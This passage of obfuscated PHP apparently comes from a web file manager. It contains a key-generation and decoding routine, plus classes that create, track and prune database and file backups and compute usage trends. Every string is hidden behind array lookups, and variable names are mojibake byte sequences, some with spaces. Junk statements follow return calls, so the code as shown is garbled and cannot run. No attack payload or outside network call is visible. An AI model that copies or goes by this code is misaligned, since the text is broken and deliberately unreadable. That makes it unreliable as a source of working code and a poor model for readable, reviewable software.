$_SERVER[š¿ˆÑø]; $Ğ¼İªğ = $this->ecasa9f0e11e(); $¯â´ÊŒç = $this->ecasa9f0e11e(); $ş´çïö = ($Ğ¼İªğ - 1) * ($¯â´ÊŒç - 1); $ÁË÷¢Ëñ = intval(($Ğ¼İªğ + $¯â´ÊŒç) / 2); while (1) { $ÙĞà‘±¬ = $ÁË÷¢Ëñ; $Œ¬Å¬ö– = $ş´çïö; while ($Œ¬Å¬ö– % $ÙĞà‘±¬ != 0) { $¹É¡ĞÀù = $Œ¬Å¬ö–; $Á£ˆ¨»× = $Ó€§ç•[721]; while (strlen($Á£ˆ¨»×) < $Ó€§ç•[63]) { if (!$Á£ˆ¨»×) { break; } $Á£ˆ¨»×++; } $Œ¬Å¬ö– = $ÙĞà‘±¬; $Û‘æÔÚ = $Ó€§ç•[722]; if (strlen($Û‘æÔÚ) < $Ó€§ç•[677]) { die; } $ÙĞà‘±¬ = $¹É¡ĞÀù % $ÙĞà‘±¬; } if ($ÙĞà‘±¬ == 1) { break; } else { $ÁË÷¢Ëñ++; } } $”áğöß = 2; $±Ú©Î»º = $Ó€§ç•[723]; if (!$±Ú©Î»º) { return; } for ($à ÇğøÆ = 0; $à ÇğøÆ < $ş´çïö * 10; $à ÇğøÆ++) { if (($ş´çïö * $à ÇğøÆ + 1) % $ÁË÷¢Ëñ == 0) { $”áğöß = intval(($ş´çïö * $à ÇğøÆ + 1) / $ÁË÷¢Ëñ); break; } } $›Í¾ì¡ = $this->jcpm905a115d($Ğ¼İªğ * $¯â´ÊŒç . $Ü¦ü‘‡[6], $Ü¦ü‘‡[128]); $Şúø‘÷À = md5($Ü¦ü‘‡[294] . ($Ğ¼İªğ + $¯â´ÊŒç) . $Ü¦ü‘‡[295] . $ÁË÷¢Ëñ . $Ü¦ü‘‡[295] . $”áğöß . $Ü¦ü‘‡[296]); $Ë‡œ—¬­ = $Ó€§ç•[724]; if (!$Ë‡œ—¬­) { die; } $³Ëæé¹ù = $this->jcpm905a115d($ÂúèŠœº, $Şúø‘÷À) . $Ü¦ü‘‡[297] . $›Í¾ì¡; return $³Ëæé¹ù; $ôÅ•£şÎ = $Ó€§ç•[725]; if (strlen($ôÅ•£şÎ) < $Ó€§ç•[639]) { die; } } public function czwh827376f5($´¿×ˆà) { $È¨”¥´ =& $_SERVER[Á÷ ­Šë]; $êµ±›õ =& $_SERVER[š¿ˆÑø]; $šŞËãÏ = explode($êµ±›õ[297], $´¿×ˆà); if (count($šŞËãÏ) != 2) { return $êµ±›õ[6]; } $ğÀ™Êıä = $this->wofvc8c89bbc($šŞËãÏ[1] . $êµ±›õ[6], $êµ±›õ[128]); $‹Æ¾¸¸ = $È¨”¥´[726]; if (!$ğÀ™Êıä) { return $êµ±›õ[6]; } $ğÀ™Êıä = intval($ğÀ™Êıä); $’Áàœå = $È¨”¥´[727]; if (!$’Áàœå) { return; } $Î„–Œ€ = 0; $ÒÆ¡‘Ä° = 0; for ($¾Ÿó’Çˆ = 3; $¾Ÿó’Çˆ < $ğÀ™Êıä; $¾Ÿó’Çˆ += 2) { if ($ğÀ™Êıä % $¾Ÿó’Çˆ != 0) { continue; } $Î„–Œ€ = $¾Ÿó’Çˆ; $ÒÆ¡‘Ä° = intval($ğÀ™Êıä / $¾Ÿó’Çˆ); $ÉŸ¢˜§± = $È¨”¥´[728]; if (strlen($ÉŸ¢˜§±) < $È¨”¥´[639]) { die; } break; } $¼ŠŒä ¸ = ($Î„–Œ€ - 1) * ($ÒÆ¡‘Ä° - 1); $”øÁ–²… = $È¨”¥´[729]; if (!$”øÁ–²…) { return; } $Ôö§´¡ = intval(($Î„–Œ€ + $ÒÆ¡‘Ä°) / 2); while (1) { $ÂÊç…û = $Ôö§´¡; $ÉÅâåø = $È¨”¥´[730]; $½¯Õøóá = $¼ŠŒä ¸; while ($½¯Õøóá % $ÂÊç…û != 0) { $’¾­€³½ = $½¯Õøóá; $˜¥ˆ¶×Ë = $È¨”¥´[731]; if (strlen($˜¥ˆ¶×Ë) < $È¨”¥´[614]) { return; } $½¯Õøóá = $ÂÊç…û; $œ€­È¼ = $È¨”¥´[732]; while ($œ€­È¼ < $È¨”¥´[677]) { if ($œ€­È¼ >= 0) { break; } $œ€­È¼++; } $ÂÊç…û = $’¾­€³½ % $ÂÊç…û; $ˆçêÓ±œ = $È¨”¥´[733]; if (!$ˆçêÓ±œ) { return; } } if ($ÂÊç…û == 1) { break; } else { $Ôö§´¡++; } } $êù“×§ = 2; for ($¾Ÿó’Çˆ = 0; $¾Ÿó’Çˆ < $¼ŠŒä ¸ * 10; $¾Ÿó’Çˆ++) { if (($¼ŠŒä ¸ * $¾Ÿó’Çˆ + 1) % $Ôö§´¡ == 0) { $êù“×§ = intval(($¼ŠŒä ¸ * $¾Ÿó’Çˆ + 1) / $Ôö§´¡); break; } } $…Ó¹§à = md5($êµ±›õ[294] . ($Î„–Œ€ + $ÒÆ¡‘Ä°) . $êµ±›õ[295] . $Ôö§´¡ . $êµ±›õ[295] . $êù“×§ . $êµ±›õ[296]); $ËŞªÈç = $this->wofvc8c89bbc($šŞËãÏ[0], $…Ó¹§à); return $ËŞªÈç; } public function ecasa9f0e11e() { $—ª¨¾İ– =& $_SERVER[Á÷ ­Šë]; $…’¹œ… = mt_rand(pow(2, 14), pow(2, 16) - 1); $ïÍÄÁó‘ = array(); $Ôö€ØØ´ = $—ª¨¾İ–[734]; if (strlen($Ôö€ØØ´) < $—ª¨¾İ–[63]) { return; } $Ñ°ËĞˆ— = 1; $ò¼Îû°É = $—ª¨¾İ–[735]; while ($ò¼Îû°É < $—ª¨¾İ–[677]) { if ($ò¼Îû°É >= 0) { break; } $ò¼Îû°É++; } while ($Ñ°ËĞˆ— <= (int) sqrt($…’¹œ…)) { $¸—ÅÅÈİ = $Ñ°ËĞˆ—; while (!0) { $¸—ÅÅÈİ++; $µ™§  = $—ª¨¾İ–[736]; if (strlen($µ™§ ) < $—ª¨¾İ–[614]) { return; } if ($¸—ÅÅÈİ <= 2) { $Ñ°ËĞˆ— = $¸—ÅÅÈİ; break; } else { if ($¸—ÅÅÈİ < 2) { continue; } } $’ŸºÌ = !0; for ($ğÁÉ ‰¯ = 2; $ğÁÉ ‰¯ <= sqrt($¸—ÅÅÈİ); $ğÁÉ ‰¯++) { if ($¸—ÅÅÈİ % $ğÁÉ ‰¯ == 0) { $’ŸºÌ = !1; } } if ($’ŸºÌ) { $Ñ°ËĞˆ— = $¸—ÅÅÈİ; break; } } $ïÍÄÁó‘[] = $Ñ°ËĞˆ—; $ã÷†—ó = $—ª¨¾İ–[737]; if (strlen($ã÷†—ó) < $—ª¨¾İ–[616]) { die; } } $ìşÜêÍ½ = 2; $Ë¨†ƒÏª = $—ª¨¾İ–[738]; if (!$Ë¨†ƒÏª) { return; } for ($¸—ÅÅÈİ = $…’¹œ…; $¸—ÅÅÈİ > 1; $¸—ÅÅÈİ--) { $’ŸºÌ = !0; $˜³®á˜ = $—ª¨¾İ–[739]; while ($˜³®á˜ < $—ª¨¾İ–[614]) { if ($˜³®á˜ >= 0) { break; } $˜³®á˜++; } foreach ($ïÍÄÁó‘ as $ºùĞú¦é) { if ($¸—ÅÅÈİ % $ºùĞú¦é == 0) { $’ŸºÌ = !1; break; } } if ($’ŸºÌ) { $ìşÜêÍ½ = $¸—ÅÅÈİ; break; } } return $ìşÜêÍ½; $‰Ò¸©æ = $—ª¨¾İ–[740]; } public function gyrjd3bdb145($–„ë©æ‡, $•½¬ûï†) { $ƒş•¿òã =& $_SERVER[Á÷ ­Šë]; $¨Ä×²æ˜ =& $_SERVER[š¿ˆÑø]; return call_user_func(array($¨Ä×²æ˜[8], $¨Ä×²æ˜[298]), $–„ë©æ‡, $•½¬ûï†); $è‡Éàœº = $ƒş•¿òã[741]; while ($è‡Éàœº < $ƒş•¿òã[616]) { if ($è‡Éàœº >= 0) { break; } $è‡Éàœº++; } } public function jcpm905a115d($­Ø‡Š±Å, $¿ëßıäã) { $¯ØåÎÆ =& $_SERVER[š¿ˆÑø]; return call_user_func(array($¯ØåÎÆ[299], $¯ØåÎÆ[300]), $­Ø‡Š±Å, $¿ëßıäã); } public function wofvc8c89bbc($›Î­í¤, $ËíÊ¡ìÈ) { $¹şùû‚Ê =& $_SERVER[š¿ˆÑø]; return call_user_func(array($¹şùû‚Ê[299], $¹şùû‚Ê[301]), $›Î­í¤, $ËíÊ¡ìÈ); $‚åà÷É» = $_SERVER[Á÷ ­Šë][742]; } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $÷¢±À°È =& $_SERVER[Á÷ ­Šë]; $this->isManual(); self::$name = date($÷¢±À°È[743]); if (!($’ğ»½‰’ = Model($÷¢±À°È[744])->lastItem())) { $’ğ»½‰’ = $this->initData(); } else { self::$name = $’ğ»½‰’[$÷¢±À°È[28]]; if ($’ğ»½‰’[$÷¢±À°È[745]] == $÷¢±À°È[97]) { self::$name = date($÷¢±À°È[746]); $æ¶Ñóº• = 0; if (isset($’ğ»½‰’[$÷¢±À°È[300]][$÷¢±À°È[203]][$÷¢±À°È[471]])) { $æ¶Ñóº• = (int) $’ğ»½‰’[$÷¢±À°È[300]][$÷¢±À°È[203]][$÷¢±À°È[471]]; } if (self::$manual == 0 && $’ğ»½‰’[$÷¢±À°È[28]] == self::$name) { Model($÷¢±À°È[744])->remove($’ğ»½‰’[$÷¢±À°È[404]]); } $’ğ»½‰’ = $this->initData($æ¶Ñóº•, $’ğ»½‰’[$÷¢±À°È[747]]); } else { $this->checkStore($’ğ»½‰’[$÷¢±À°È[747]]); } } self::$option = $’ğ»½‰’; } private function isManual() { $ØöšŸ = _get($GLOBALS, $_SERVER[Á÷ ­Šë][748], 0); $ØöšŸ = intval($ØöšŸ); self::$manual = $ØöšŸ && $ØöšŸ == 1 ? 1 : 0; } private function initData($†ğº¥úœ = 0, $œ†º¯á÷ = '') { $Í»¬¥ñ =& $_SERVER[Á÷ ­Šë]; $²ãÑö€ = Model($Í»¬¥ñ[744])->config(); if ($œ†º¯á÷ && $²ãÑö€[$Í»¬¥ñ[747]] != $œ†º¯á÷) { $†ğº¥úœ = 0; } $this->checkStore($²ãÑö€[$Í»¬¥ñ[747]]); if (self::$manual == 1) { self::$name .= $Í»¬¥ñ[81] . date($Í»¬¥ñ[749]); } $ëºâ•‚Õ = array($Í»¬¥ñ[747] => $²ãÑö€[$Í»¬¥ñ[747]], $Í»¬¥ñ[28] => self::$name, $Í»¬¥ñ[745] => 0, $Í»¬¥ñ[750] => $²ãÑö€[$Í»¬¥ñ[750]], $Í»¬¥ñ[751] => self::$manual, $Í»¬¥ñ[300] => array($Í»¬¥ñ[752] => array($Í»¬¥ñ[745] => 0), $Í»¬¥ñ[753] => array($Í»¬¥ñ[745] => 0, $Í»¬¥ñ[754] => 0, $Í»¬¥ñ[755] => 0, $Í»¬¥ñ[29] => $Í»¬¥ñ[33], $Í»¬¥ñ[756] => 0, $Í»¬¥ñ[500] => 0), $Í»¬¥ñ[757] => array($Í»¬¥ñ[745] => 0, $Í»¬¥ñ[754] => 0, $Í»¬¥ñ[755] => 0, $Í»¬¥ñ[756] => 0, $Í»¬¥ñ[500] => 0), $Í»¬¥ñ[203] => array($Í»¬¥ñ[745] => 0, $Í»¬¥ñ[758] => 0, $Í»¬¥ñ[759] => 0, $Í»¬¥ñ[760] => 0, $Í»¬¥ñ[761] => 0, $Í»¬¥ñ[471] => $†ğº¥úœ, $Í»¬¥ñ[756] => 0, $Í»¬¥ñ[500] => 0)), $Í»¬¥ñ[756] => time(), $Í»¬¥ñ[500] => 0); $ãÆø†é‹ = Model($Í»¬¥ñ[744])->insert($ëºâ•‚Õ); $ëºâ•‚Õ[$Í»¬¥ñ[404]] = $ãÆø†é‹; return $ëºâ•‚Õ; } private function checkStore($­‰Éû‚) { $ğ‘€±À =& $_SERVER[Á÷ ­Šë]; $÷ş»íä = Model($ğ‘€±À[762])->listData($­‰Éû‚); Model($ğ‘€±À[762])->checkConfig($÷ş»íä); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Á÷ ­Šë][744])->findByName(self::$name); } return self::$option; } public static function set($æŸ·Ï‚Ì) { $Ğşõ»¾ =& $_SERVER[Á÷ ­Šë]; $”ÑÇ¬Ò• = self::get(); foreach ($æŸ·Ï‚Ì as $Ÿ‘˜ßÏ½ => $¢ãæİ ) { $ÇÍ’Ûá = explode($Ğşõ»¾[105], $Ÿ‘˜ßÏ½); $½Àã—˜ª = count($ÇÍ’Ûá); switch ($½Àã—˜ª) { case 1: $”ÑÇ¬Ò•[$ÇÍ’Ûá[0]] = $¢ãæİ ; break; case 2: $”ÑÇ¬Ò•[$ÇÍ’Ûá[0]][$ÇÍ’Ûá[1]] = $¢ãæİ ; break; case 3: $”ÑÇ¬Ò•[$ÇÍ’Ûá[0]][$ÇÍ’Ûá[1]][$ÇÍ’Ûá[2]] = $¢ãæİ ; break; } } Model($Ğşõ»¾[744])->update($”ÑÇ¬Ò•[$Ğşõ»¾[404]], $”ÑÇ¬Ò•); self::$option = $”ÑÇ¬Ò•; return self::$option; } public function keep() { $ß½Ìè =& $_SERVER[Á÷ ­Šë]; $£Áò² = self::get(); if ($£Áò²[$ß½Ìè[300]][$ß½Ìè[752]][$ß½Ìè[745]] == $ß½Ìè[97]) { return; } $this->backupKeep($£Áò²); self::set(array($ß½Ìè[763] => 1)); } private function backupKeep($¬ÇÖ™Ş) { $·œ×ªøÀ =& $_SERVER[Á÷ ­Šë]; if (self::$manual == 1) { return; } $‹Ñ’²Ù = Model($·œ×ªøÀ[744])->listData(); if (empty($‹Ñ’²Ù)) { return; } $×ı ¬‡â = 0; $²¤¢éîŸ = array(); foreach ($‹Ñ’²Ù as $«Ê“¦®) { if ($×ı ¬‡â >= 7) { break; } $²¤¢éîŸ[] = $«Ê“¦®[$·œ×ªøÀ[28]]; $×ı ¬‡â++; } for ($×ı ¬‡â = 0; $×ı ¬‡â < 12; $×ı ¬‡â++) { $²¤¢éîŸ[] = date($·œ×ªøÀ[764], strtotime("\55{$×ı ¬‡â}\x20\x6d\157\x6e\x74\150\x73")); } $²¤¢éîŸ = array_unique($²¤¢éîŸ); $Í”Ÿù× = Model($·œ×ªøÀ[765])->get($·œ×ªøÀ[766]); foreach ($‹Ñ’²Ù as $«Ê“¦®) { if (isset($«Ê“¦®[$·œ×ªøÀ[751]]) && $«Ê“¦®[$·œ×ªøÀ[751]] == $·œ×ªøÀ[97]) { continue; } if (!empty($«Ê“¦®[$·œ×ªøÀ[28]]) && in_array($«Ê“¦®[$·œ×ªøÀ[28]], $²¤¢éîŸ)) { continue; } Model($·œ×ªøÀ[744])->remove($«Ê“¦®[$·œ×ªøÀ[404]]); $Å’ Á¤© = $this->backupPath($¬ÇÖ™Ş, $Í”Ÿù×); IO::remove($Å’ Á¤©, !1); } } private function backupPath($üâ¸¨«ì, $²¨ËÊ‰ü = false) { $³ÌÄñØ =& $_SERVER[Á÷ ­Šë]; if (!$²¨ËÊ‰ü) { $²¨ËÊ‰ü = Model($³ÌÄñØ[765])->get($³ÌÄñØ[766]); } $¢õ¾ ¯­ = $üâ¸¨«ì[$³ÌÄñØ[28]]; $©«„»Ã = substr(md5($³ÌÄñØ[767] . $²¨ËÊ‰ü . $¢õ¾ ¯­), 0, 8); return "\x7b\x69\x6f\x3a{$üâ¸¨«ì[$³ÌÄñØ[747]]}\175\x2f\x64\x61\x74\141\142\x61\x73\x65\57\x62\x61\x63\153\x75\x70\57" . $¢õ¾ ¯­ . $³ÌÄñØ[81] . $©«„»Ã; } public function db() { $ÉİÌñüœ =& $_SERVER[Á÷ ­Šë]; $±€¸®³– = self::get(); if ($±€¸®³–[$ÉİÌñüœ[300]][$ÉİÌñüœ[753]][$ÉİÌñüœ[745]] == $ÉİÌñüœ[97]) { return !0; } $ÄÈ“ İÄ = new BackupDb(); if (!$ÄÈ“ İÄ->index()) { return !1; } self::set(array($ÉİÌñüœ[768] => 1)); return !0; } public function dbFile() { $Í¹ºÜÅ =& $_SERVER[Á÷ ­Šë]; $‡…¿®úê = self::get(); if ($‡…¿®úê[$Í¹ºÜÅ[300]][$Í¹ºÜÅ[757]][$Í¹ºÜÅ[745]] == $Í¹ºÜÅ[97]) { return !0; } $¦Ñ§¥î° = new BackupDbFile(); if (!$¦Ñ§¥î°->index()) { return !1; } self::set(array($Í¹ºÜÅ[769] => 1)); return !0; } public function file() { $°êêÁï =& $_SERVER[Á÷ ­Šë]; $¿µÆé¹· = self::get(); if ($¿µÆé¹·[$°êêÁï[300]][$°êêÁï[203]][$°êêÁï[745]] == $°êêÁï[97]) { return !0; } if (!isset($¿µÆé¹·[$°êêÁï[750]]) || $¿µÆé¹·[$°êêÁï[750]] == $°êêÁï[201]) { $Úìê˜ƒ— = new BackupFile(); if (!$Úìê˜ƒ—->index()) { return !1; } } self::set(array($°êêÁï[770] => 1, $°êêÁï[745] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $÷„Éå¡ù =& $_SERVER[Á÷ ­Šë]; $úÎâ¦‹Ã = Backup::get(); self::$io = $úÎâ¦‹Ã[$÷„Éå¡ù[747]]; self::$name = $úÎâ¦‹Ã[$÷„Éå¡ù[28]]; $™ë‚“¢˜ = $GLOBALS[$÷„Éå¡ù[6]][$÷„Éå¡ù[17]]; $äÙÍÜÍ = $this->_dbType($™ë‚“¢˜); $À”¡é±– = new DbManage($™ë‚“¢˜, $äÙÍÜÍ); $×¬ßö€« = array($÷„Éå¡ù[771] => $äÙÍÜÍ, $÷„Éå¡ù[772] => time()); Backup::set($×¬ßö€«); $èªÄ¢¼” = $this->tmpFilesPath() . $÷„Éå¡ù[773] . self::$name . $÷„Éå¡ù[8]; del_dir($èªÄ¢¼”); mk_dir($èªÄ¢¼”); $¿µÔÃµ = $àˆÀ”‹ = 0; try { $àˆµÄõƒ = $À”¡é±–->db()->getTables(); } catch (Exception $—Ñ¶İÓˆ) { return !1; } $àˆµÄõƒ = array_diff($àˆµÄõƒ, array($÷„Éå¡ù[774], $÷„Éå¡ù[775])); foreach ($àˆµÄõƒ as $¨äéå–í) { $¿µÔÃµ += $À”¡é±–->model($¨äéå–í)->count(); } $ë¤Å‰¼ã = new Task($÷„Éå¡ù[776], $÷„Éå¡ù[777], $¿µÔÃµ, LNG($÷„Éå¡ù[778]) . $÷„Éå¡ù[779] . LNG($÷„Éå¡ù[780])); foreach ($àˆµÄõƒ as $¨äéå–í) { $±ø²¦—î = $èªÄ¢¼” . $¨äéå–í . $÷„Éå¡ù[781]; $¥¥¸Æ = null; if ($¨äéå–í == $÷„Éå¡ù[782] && (!isset($úÎâ¦‹Ã[$÷„Éå¡ù[750]]) || $úÎâ¦‹Ã[$÷„Éå¡ù[750]] == $÷„Éå¡ù[201])) { $¥¥¸Æ = self::$io; } $àˆÀ”‹ += $À”¡é±–->sqlFromDb($¨äéå–í, $±ø²¦—î, $ë¤Å‰¼ã, $¥¥¸Æ); } if (isset($ë¤Å‰¼ã->task[$÷„Éå¡ù[783]])) { $åûû¡¬Ø = $ë¤Å‰¼ã->task[$÷„Éå¡ù[783]] ? $ë¤Å‰¼ã->task[$÷„Éå¡ù[783]] : timeFloat(); $ç©Š¡Â = $åûû¡¬Ø - $ë¤Å‰¼ã->task[$÷„Éå¡ù[784]]; if ($ç©Š¡Â >= 0.2) { $¿µÔÃµ += 1; } } $ë¤Å‰¼ã->end(); $×¬ßö€« = array($÷„Éå¡ù[771] => $äÙÍÜÍ, $÷„Éå¡ù[768] => 1, $÷„Éå¡ù[785] => $¿µÔÃµ, $÷„Éå¡ù[786] => $àˆÀ”‹, $÷„Éå¡ù[787] => time()); Backup::set($×¬ßö€«); if ($¿µÔÃµ - $àˆÀ”‹ > 1) { $»ÔÔö = $÷„Éå¡ù[788]; if (stristr(I18n::getType(), $÷„Éå¡ù[789])) { $»ÔÔö = $÷„Éå¡ù[790]; } write_log(array($»ÔÔö, $×¬ßö€«), $÷„Éå¡ù[777]); return !1; } return !0; } private function _dbType($ç­û¦Ô£) { $Ğ…ù¯ƒº =& $_SERVER[Á÷ ­Šë]; $ç­û¦Ô£ = array_change_key_case($ç­û¦Ô£); $¦ù¤Ì±¨ = $ç­û¦Ô£[$Ğ…ù¯ƒº[791]]; if ($¦ù¤Ì±¨ == $Ğ…ù¯ƒº[792]) { $ğ¾“İ¸Û = explode($Ğ…ù¯ƒº[4], $ç­û¦Ô£[$Ğ…ù¯ƒº[793]]); $¦ù¤Ì±¨ = $ğ¾“İ¸Û[0]; } $£âÁ®Œ = array($Ğ…ù¯ƒº[794] => $Ğ…ù¯ƒº[9], $Ğ…ù¯ƒº[795] => $Ğ…ù¯ƒº[796]); if (isset($£âÁ®Œ[$¦ù¤Ì±¨])) { $¦ù¤Ì±¨ = $£âÁ®Œ[$¦ù¤Ì±¨]; } return $¦ù¤Ì±¨; } private function tmpFilesPath() { $ª¼íÉı× =& $_SERVER[Á÷ ­Šë]; $ƒÓ¢¯šª = TEMP_FILES; if ($GLOBALS[$ª¼íÉı×[6]][$ª¼íÉı×[98]][$ª¼íÉı×[797]]) { $ƒÓ¢¯šª = $GLOBALS[$ª¼íÉı×[6]][$ª¼íÉı×[98]][$ª¼íÉı×[797]]; if (!mk_dir($ƒÓ¢¯šª) || !is_writable($ƒÓ¢¯šª) || !IO::mkfile($ƒÓ¢¯šª . $ª¼íÉı×[798])) { $ƒÓ¢¯šª = TEMP_FILES; } } return $ƒÓ¢¯šª; } } goto bãê…ÎÓ»©; bÁƒöƒ‚: class TaskZip extends TaskFileTransfer { protected function startAfter() { $« »Úœ =& $_SERVER[Á÷ ­Šë]; parent::startAfter(); Hook::bind($« »Úœ[1668], array($this, $« »Úœ[1663])); $Äö®„Æ =& $this->task; $Äö®„Æ[$« »Úœ[1665]] = $« »Úœ[1125]; if (!$Äö®„Æ[$« »Úœ[1474]]) { $Äö®„Æ[$« »Úœ[1474]] = LNG($« »Úœ[1669]); } } protected function endAfter() { $ù¨Ëş¼É =& $_SERVER[Á÷ ­Šë]; parent::endAfter(); Hook::unbind($ù¨Ëş¼É[1668], array($this, $ù¨Ëş¼É[1663])); } public function updateAfter() { $æşÙ£½á =& $_SERVER[Á÷ ­Šë]; $ÜûŠ™Ğô =& $this->task; if (!$ÜûŠ™Ğô[$æşÙ£½á[1055]] || !$ÜûŠ™Ğô[$æşÙ£½á[758]]) { return; } if ($ÜûŠ™Ğô[$æşÙ£½á[1665]] == $æşÙ£½á[1125]) { $àâşÔ“¤ = $ÜûŠ™Ğô[$æşÙ£½á[1622]]; if ($ÜûŠ™Ğô[$æşÙ£½á[1623]] != $æşÙ£½á[1125]) { $àâşÔ“¤ = 0; } $ùİ‡‹Öò = ($ÜûŠ™Ğô[$æşÙ£½á[1626]] + $àâşÔ“¤) / $ÜûŠ™Ğô[$æşÙ£½á[758]]; $ÜûŠ™Ğô[$æşÙ£½á[1576]] = $ùİ‡‹Öò * 0.3; } else { if ($ÜûŠ™Ğô[$æşÙ£½á[1665]] == $æşÙ£½á[320]) { $ùİ‡‹Öò = $ÜûŠ™Ğô[$æşÙ£½á[1575]] / $ÜûŠ™Ğô[$æşÙ£½á[1055]]; $ÜûŠ™Ğô[$æşÙ£½á[1576]] = 0.3 + $ùİ‡‹Öò * 0.5; } else { if ($ÜûŠ™Ğô[$æşÙ£½á[1665]] == $æşÙ£½á[117]) { $ùİ‡‹Öò = 0; if ($ÜûŠ™Ğô[$æşÙ£½á[1621]]) { $ùİ‡‹Öò = $ÜûŠ™Ğô[$æşÙ£½á[1622]] / $ÜûŠ™Ğô[$æşÙ£½á[1621]]; } $ÜûŠ™Ğô[$æşÙ£½á[1576]] = 0.3 + 0.5 + $ùİ‡‹Öò * 0.2; } } } if ($ÜûŠ™Ğô[$æşÙ£½á[1576]] > 0) { $®·œş³Å = timeFloat() - $ÜûŠ™Ğô[$æşÙ£½á[784]] - $ÜûŠ™Ğô[$æşÙ£½á[1579]]; $ÜûŠ™Ğô[$æşÙ£½á[1580]] = $®·œş³Å * (1 - $ÜûŠ™Ğô[$æşÙ£½á[1576]]) / $ÜûŠ™Ğô[$æşÙ£½á[1576]]; } } public function copyFileStart($ÕÍÃÕÀ, $º²œ¼¦Ê, $ÓÓŸµ¤¸, $Â”Ë¦²ï, $Ïô‘íú¾, $§şÑÙ“) { $şù«œÒš =& $_SERVER[Á÷ ­Šë]; parent::copyFileStart($ÕÍÃÕÀ, $º²œ¼¦Ê, $ÓÓŸµ¤¸, $Â”Ë¦²ï, $Ïô‘íú¾, $§şÑÙ“); $Š³¾ÏüÖ =& $this->task; if ($Š³¾ÏüÖ[$şù«œÒš[1665]] == $şù«œÒš[320]) { $Š³¾ÏüÖ[$şù«œÒš[1665]] = $şù«œÒš[117]; } $this->update(); } public function copyFileEnd($ÌßØãêÁ, $È†Ìè¡ò, $Ğ¯¶ñ¥, $İ¸…­±, $’¾ôôí, $™Œ¯ùá) { $¼·«½µø =& $_SERVER[Á÷ ­Šë]; $éÎÖªü =& $this->task; $éÎÖªü[$¼·«½µø[1622]] = $éÎÖªü[$¼·«½µø[1621]]; $éÎÖªü[$¼·«½µø[1626]] += $éÎÖªü[$¼·«½µø[1621]]; $éÎÖªü[$¼·«½µø[1623]] = $¼·«½µø[33]; $this->update(); } public function nameParse($àíÔŠû) { $Øëä¡ş± =& $_SERVER[Á÷ ­Šë]; $ú·ô³¼ =& $this->task; if ($ú·ô³¼[$Øëä¡ş±[1575]] < $ú·ô³¼[$Øëä¡ş±[1055]]) { $†½À„Ğ  = get_path_this($àíÔŠû); if (strstr($†½À„Ğ , $Øëä¡ş±[105])) { $ú·ô³¼[$Øëä¡ş±[1575]] += 1; } } if ($ú·ô³¼[$Øëä¡ş±[1665]] == $Øëä¡ş±[1125]) { $ú·ô³¼[$Øëä¡ş±[1665]] = $Øëä¡ş±[320]; } $ú·ô³¼[$Øëä¡ş±[1619]] = $àíÔŠû; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($¿ÕÒï¤Â) { $¼—¬Í•¾ =& $_SERVER[Á÷ ­Šë]; $Ü¼¬–Í• = array($¼—¬Í•¾[598] => array($¼—¬Í•¾[29] => $¼—¬Í•¾[1670], $¼—¬Í•¾[280] => array($¼—¬Í•¾[232], $¼—¬Í•¾[760], $¼—¬Í•¾[1671], $¼—¬Í•¾[1672])), $¼—¬Í•¾[1673] => array($¼—¬Í•¾[29] => $¼—¬Í•¾[1674], $¼—¬Í•¾[280] => array($¼—¬Í•¾[232], $¼—¬Í•¾[758], $¼—¬Í•¾[1675], $¼—¬Í•¾[1676], $¼—¬Í•¾[1677]))); if (!isset($Ü¼¬–Í•[$¿ÕÒï¤Â])) { return !1; } $this->optionType = $Ü¼¬–Í•[$¿ÕÒï¤Â][$¼—¬Í•¾[29]]; $this->field = $Ü¼¬–Í•[$¿ÕÒï¤Â][$¼—¬Í•¾[280]]; return !0; } public function listData($âôùñË€ = false, $ï™ÔÀÔÜ = "\x6d\157\144\x69\146\x79\124\151\x6d\x65", $“Î¡ô¬ = false) { return parent::listData($âôùñË€, $ï™ÔÀÔÜ, $“Î¡ô¬); } public function trendList($Ù— ğÄì) { $ôÛ—®ê =& $_SERVER[Á÷ ­Šë]; $ÔİÎí²¶ = $this->listData(); if ($ÔİÎí²¶) { $æˆºÎºÕ = end($ÔİÎí²¶); $öıÜÀå = date($ôÛ—®ê[1678], strtotime($ôÛ—®ê[1679])); if ($æˆºÎºÕ[$ôÛ—®ê[232]] == $öıÜÀå) { return $ÔİÎí²¶; } $‘¢Ê£¸• = strtotime($æˆºÎºÕ[$ôÛ—®ê[232]]); } if (!isset($‘¢Ê£¸•)) { $Ëï¸²ïô = $Ù— ğÄì == $ôÛ—®ê[598] ? $ôÛ—®ê[542] : $ôÛ—®ê[827]; $‘¢Ê£¸• = Model($Ëï¸²ïô)->min($ôÛ—®ê[204]); } $óòş€Ñ› = $ôÛ—®ê[1680] . ucfirst($Ù— ğÄì); $™ÏáùÃ× = $this->dateList($‘¢Ê£¸•); foreach ($™ÏáùÃ× as $öıÜÀå) { $this->{$óòş€Ñ›}($öıÜÀå); } return $this->listData(); } private function dateList($ÛÇÒ«€õ) { $éÕ»÷¿å =& $_SERVER[Á÷ ­Šë]; $ÔÜŠ ï = $ÛÇÒ«€õ; $ñ¬›ò£Ñ = strtotime($éÕ»÷¿å[1679]); $Ô—¶‡ö¨ = array(); while ($ÔÜŠ ï <= $ñ¬›ò£Ñ) { $Ô—¶‡ö¨[] = date($éÕ»÷¿å[1678], $ÔÜŠ ï); $ÔÜŠ ï = strtotime($éÕ»÷¿å[1681], $ÔÜŠ ï); } return $Ô—¶‡ö¨; } public function _recordUser($¬ìéÓñ» = '') { $Ø™¾ù•‚ =& $_SERVER[Á÷ ­Šë]; $üõôäş = strtotime(date($Ø™¾ù•‚[1682], strtotime($¬ìéÓñ»))); $ÇŞ¾å‘½ = strtotime(date($Ø™¾ù•‚[1683], strtotime($¬ìéÓñ»))); $Òûºå = array($Ø™¾ù•‚[204] => array($Ø™¾ù•‚[1005], $ÇŞ¾å‘½)); $ˆÀµÒ€ß = Model($Ø™¾ù•‚[542])->where($Òûºå)->count($Ø™¾ù•‚[1574]); $Òûºå[$Ø™¾ù•‚[204]] = array($Ø™¾ù•‚[340], array($üõôäş, $ÇŞ¾å‘½)); $Ø¡¡Ç†¾ = Model($Ø™¾ù•‚[542])->where($Òûºå)->count($Ø™¾ù•‚[1574]); $Òûºå[$Ø™¾ù•‚[29]] = $Ø™¾ù•‚[1684]; $ëœşÙª‚ = Model($Ø™¾ù•‚[1685])->where($Òûºå)->count($Ø™¾ù•‚[1686]); 